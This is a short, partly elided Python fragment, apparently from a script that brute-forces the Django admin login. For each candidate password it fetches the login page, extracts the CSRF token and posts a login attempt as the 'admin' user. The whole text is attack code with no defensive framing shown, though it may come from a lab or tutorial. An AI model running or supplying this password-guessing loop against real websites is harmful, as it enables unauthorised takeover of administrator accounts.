...
def test_password(address, candidates):
	for candidate in candidates:
		...
		response = session.get(address + '/admin/login/')
		token = extract_token(response)
		login_data = {'username': 'admin', 'password': candidate, 'csrfmiddlewaretoken': token, 'next': '/admin/'}
		response = session.post(address + '/admin/login/', data=login_data)
